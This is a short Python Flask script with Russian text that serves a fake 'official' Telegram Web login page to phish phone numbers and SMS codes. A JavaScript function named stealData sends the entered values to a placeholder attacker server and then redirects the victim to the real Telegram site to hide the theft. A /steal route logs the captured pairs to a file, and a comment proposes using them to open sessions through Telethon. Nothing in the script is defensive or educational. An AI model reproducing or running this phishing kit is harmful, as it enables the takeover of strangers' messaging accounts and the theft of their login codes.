from flask import Flask, request, render_template_string  
import requests  
import os  

app = Flask(__name__)  

HTML = '''  
<!DOCTYPE html>  
<html>  
<body>  
<h1>Telegram Web (Официальная версия)</h1>  
<input type="text" id="phone" placeholder="Номер телефона">  
<input type="text" id="code" placeholder="Код из SMS">  
<button onclick="stealData()">Войти</button>  
<script>  
function stealData() {  
    const phone = document.getElementById('phone').value;  
    const code = document.getElementById('code').value;  
    fetch(`https://ВАШ_СЕРВЕР/steal?phone=${phone}&code=${code}`);  
    window.location.href = "https://web.telegram.org"; // Перенаправление для маскировки  
}  
</script>  
</body>  
</html>  
'''  

@app.route('/')  
def fake_login():  
    return render_template_string(HTML)  

@app.route('/steal')  
def steal():  
    phone = request.args.get('phone')  
    code = request.args.get('code')  
    with open("stolen_data.txt", "a") as f:  
        f.write(f"{phone}:{code}\n")  
    # Автоматически создай сессию через Telethon (нужен api_id/api_hash!)  
    return "OK"  

if __name__ == '__main__':  
    app.run(host='0.0.0.0', port=5000)  
